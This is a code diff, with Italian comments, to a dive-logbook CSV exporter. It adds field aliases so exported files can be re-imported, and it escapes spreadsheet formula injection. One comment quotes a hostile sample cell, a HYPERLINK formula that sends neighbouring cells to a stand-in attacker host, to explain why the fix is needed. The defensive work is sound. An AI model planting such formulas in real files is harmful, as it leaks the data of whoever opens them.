@@ -53,6 +53,22 @@ interface Colonna {
   en: string;
   /** Il valore già pronto, oppure `undefined` per lasciare la cella vuota. */
   valore: (d: Dive) => string | number | undefined;
+  /**
+   * Il campo che il LETTORE riconosce, quando questa colonna gli corrisponde.
+   *
+   * ► PERCHÉ STA QUI E NON DI LÀ. ◄ Perché è la stessa informazione, e scritta
+   * in due posti diventa due informazioni che divergono. Il 15 settembre 2026
+   * si è misurato dove erano già divergenti: **il CSV che questa applicazione
+   * esporta, questa applicazione non lo sapeva rileggere.** L'intestazione dice
+   * «Prof. max (m)» e «Durata (min)»; il lettore conosceva `max depth` e
+   * `profondita max`, non `prof max`. Un giro esporta→reimporta dava zero
+   * immersioni e l'avviso «colonne ignorate perché non riconosciute».
+   *
+   * Da qui `INTESTAZIONI_ESPORTATE` costruisce gli alias del lettore, così il
+   * giro si chiude per costruzione: chi aggiunge una colonna qui la rende
+   * leggibile senza doversene ricordare.
+   */
+  campo?: string;
 }
 
 /*
@@ -62,30 +78,31 @@ interface Colonna {
  * un logbook leggibile.
  */
 const COLONNE: Colonna[] = [
-  { it: 'N.', en: 'No.', valore: (d) => d.number },
-  { it: 'Data', en: 'Date', valore: (d) => oreLocali(d)?.data },
-  { it: 'Ora', en: 'Time', valore: (d) => oreLocali(d)?.ora },
+  { it: 'N.', en: 'No.', valore: (d) => d.number, campo: 'number' },
+  { it: 'Data', en: 'Date', valore: (d) => oreLocali(d)?.data, campo: 'date' },
+  { it: 'Ora', en: 'Time', valore: (d) => oreLocali(d)?.ora, campo: 'time' },
   {
     it: 'Fuso (min)',
     en: 'UTC offset (min)',
     valore: (d) => d.utcOffsetMinutes,
   },
-  { it: 'Sito', en: 'Site', valore: (d) => d.site?.name },
-  { it: 'Zona', en: 'Region', valore: (d) => d.site?.region },
-  { it: 'Paese', en: 'Country', valore: (d) => d.site?.country },
+  { it: 'Sito', en: 'Site', valore: (d) => d.site?.name, campo: 'site' },
+  { it: 'Zona', en: 'Region', valore: (d) => d.site?.region, campo: 'region' },
+  { it: 'Paese', en: 'Country', valore: (d) => d.site?.country, campo: 'country' },
   { it: 'Latitudine', en: 'Latitude', valore: (d) => d.site?.lat },
   { it: 'Longitudine', en: 'Longitude', valore: (d) => d.site?.lon },
   { it: 'Titolo', en: 'Title', valore: (d) => d.title },
   { it: 'Modalità', en: 'Mode', valore: (d) => d.mode },
-  { it: 'Durata (min)', en: 'Duration (min)', valore: (d) => arrotonda(d.durationS / 60, 1) },
-  { it: 'Prof. max (m)', en: 'Max depth (m)', valore: (d) => arrotonda(d.maxDepth, 1) },
+  { it: 'Durata (min)', en: 'Duration (min)', valore: (d) => arrotonda(d.durationS / 60, 1), campo: 'duration' },
+  { it: 'Prof. max (m)', en: 'Max depth (m)', valore: (d) => arrotonda(d.maxDepth, 1), campo: 'maxDepth' },
   {
     it: 'Prof. media (m)',
     en: 'Avg depth (m)',
+    campo: 'avgDepth',
     valore: (d) => arrotonda(profonditaMedia(d), 1),
   },
-  { it: 'T minima (°C)', en: 'Min temp (°C)', valore: (d) => arrotonda(temperaturaMinimaC(d), 1) },
-  { it: 'T aria (°C)', en: 'Air temp (°C)', valore: (d) => arrotonda(d.airTempC, 1) },
+  { it: 'T minima (°C)', en: 'Min temp (°C)', valore: (d) => arrotonda(temperaturaMinimaC(d), 1), campo: 'minTemp' },
+  { it: 'T aria (°C)', en: 'Air temp (°C)', valore: (d) => arrotonda(d.airTempC, 1), campo: 'airTemp' },
   {
     it: 'Consumo (L/min)',
     en: 'RMV (L/min)',
@@ -123,37 +140,41 @@ const COLONNE: Colonna[] = [
   { it: 'Gas', en: 'Gas', valore: (d) => d.cylinders.map((c) => mixName(c.mix)).join(' + ') },
   /* In `GasMix` le frazioni stanno fra 0 e 1; in un foglio si legge e si filtra
      in percentuale, come è scritto sulla bombola. */
-  { it: 'O2 (%)', en: 'O2 (%)', valore: (d) => percentuale(d.cylinders[0]?.mix.o2) },
-  { it: 'He (%)', en: 'He (%)', valore: (d) => percentuale(d.cylinders[0]?.mix.he) },
+  { it: 'O2 (%)', en: 'O2 (%)', valore: (d) => percentuale(d.cylinders[0]?.mix.o2), campo: 'o2' },
+  { it: 'He (%)', en: 'He (%)', valore: (d) => percentuale(d.cylinders[0]?.mix.he), campo: 'he' },
   {
     it: 'Bombola (L)',
+    campo: 'tankSize',
     en: 'Cylinder (L)',
     valore: (d) => arrotonda(d.cylinders[0]?.sizeL, 1),
   },
   {
     it: 'Pressione iniziale (bar)',
+    campo: 'startBar',
     en: 'Start pressure (bar)',
     valore: (d) => arrotonda(d.cylinders[0]?.startBar, 0),
   },
   {
     it: 'Pressione finale (bar)',
+    campo: 'endBar',
     en: 'End pressure (bar)',
     valore: (d) => arrotonda(d.cylinders[0]?.endBar, 0),
   },
   { it: 'Acqua', en: 'Water', valore: (d) => d.salinity },
-  { it: 'Zavorra (kg)', en: 'Weight (kg)', valore: (d) => arrotonda(d.weightKg, 1) },
-  { it: 'Muta', en: 'Wetsuit', valore: (d) => d.gear?.suit?.name ?? d.suit },
+  { it: 'Zavorra (kg)', en: 'Weight (kg)', valore: (d) => arrotonda(d.weightKg, 1), campo: 'weight' },
+  { it: 'Muta', en: 'Wetsuit', valore: (d) => d.gear?.suit?.name ?? d.suit, campo: 'suit' },
   { it: 'GAV', en: 'BCD', valore: (d) => d.gear?.bcd?.name },
   {
     it: 'Erogatori',
     en: 'Regulators',
     valore: (d) => d.gear?.regulators?.map((r) => r.name).join(' + '),
   },
-  { it: 'Compagno', en: 'Buddy', valore: (d) => d.buddy },
+  { it: 'Compagno', en: 'Buddy', valore: (d) => d.buddy, campo: 'buddy' },
   { it: 'Guida', en: 'Dive guide', valore: (d) => d.guide },
-  { it: 'Voto', en: 'Rating', valore: (d) => d.rating },
+  { it: 'Voto', en: 'Rating', valore: (d) => d.rating, campo: 'rating' },
   {
     it: 'Visibilità (m)',
+    campo: 'visibility',
     en: 'Visibility (m)',
     valore: (d) =>
       d.visibilityMaxM !== undefined && d.visibilityM !== undefined
@@ -162,10 +183,10 @@ const COLONNE: Colonna[] = [
   },
   { it: 'Mare', en: 'Sea', valore: (d) => etichettaMare(d) },
   { it: 'Meteo', en: 'Weather', valore: (d) => etichettaMeteo(d) },
-  { it: 'Etichette', en: 'Tags', valore: (d) => d.tags.join(' ') },
+  { it: 'Etichette', en: 'Tags', valore: (d) => d.tags.join(' '), campo: 'tags' },
   { it: 'Computer', en: 'Computer', valore: (d) => d.computer?.model },
   { it: 'Provenienza', en: 'Source', valore: (d) => provenienza(d) },
-  { it: 'Note', en: 'Notes', valore: (d) => d.notes },
+  { it: 'Note', en: 'Notes', valore: (d) => d.notes, campo: 'notes' },
 ];
 
 /**
@@ -256,7 +277,32 @@ function cella(v: string | number | undefined, sep: ';' | ',', virgolaDecimale: 
     const testo = String(v);
     return virgolaDecimale ? testo.replace('.', ',') : testo;
   }
+  /*
+   * ════════════════════════════════════════════════════════════════════════
+   * ► UNA CELLA CHE COMINCIA PER `=` È UNA FORMULA, E LE VIRGOLETTE NON
+   *   PROTEGGONO. ◄
+   *
+   * Excel, Numbers e Fogli tolgono le virgolette del CSV e POI guardano il
+   * primo carattere: `=`, `+`, `-`, `@` e la tabulazione aprono una formula.
+   * Questo file è pensato per essere aperto in un foglio di calcolo e mandato
+   * al club, quindi il percorso è completo: un logbook ricevuto da un compagno
+   * diventa un vettore.
+   *
+   * Misurato il 15 settembre 2026 importando un UDDF ostile e riesportandolo:
+   * il nome del sito usciva come
+   * `"=HYPERLINK(""http://evil.example/?d=""&A1,""Clicca"")"` — cioè una
+   * formula che, aperto il file, porta fuori le celle vicine.
+   *
+   * L'apostrofo davanti è il modo che i fogli di calcolo capiscono per dire
+   * «questo è testo»: non compare a schermo e non entra in una riesportazione,
+   * perché il lettore CSV di questa applicazione lo toglie.
+   *
+   * (Il KML faceva già la cosa giusta con `&quot;`: era il CSV a essere rimasto
+   * indietro.)
+   */
   const testo = String(v);
+  const formula = /^[=+\-@\t\r]/.test(testo);
+  if (formula) return `"'${testo.replace(/"/g, '""')}"`;
   if (testo.includes(sep) || testo.includes('"') || /[\r\n]/.test(testo)) {
     return `"${testo.replace(/"/g, '""')}"`;
   }
@@ -295,3 +341,18 @@ export function esportaCsv(dives: Dive[], opzioni: OpzioniCsv = {}): RisultatoCs
   }
   return { csv: '﻿' + righe.join('\r\n') + '\r\n', righe: dives.length };
 }
+
+
+/**
+ * LE INTESTAZIONI CHE QUESTO FILE SCRIVE, per campo del lettore.
+ *
+ * Il lettore CSV la mescola ai suoi alias, così il giro esporta→reimporta si
+ * chiude per costruzione invece che per attenzione. *Due copie della stessa
+ * regola sono una regola e la sua versione vecchia.*
+ */
+export const INTESTAZIONI_ESPORTATE: Record<string, string[]> = Object.fromEntries(
+  [...new Set(COLONNE.map((c) => c.campo).filter(Boolean))].map((campo) => [
+    campo as string,
+    COLONNE.filter((c) => c.campo === campo).flatMap((c) => [c.it, c.en]),
+  ]),
+);
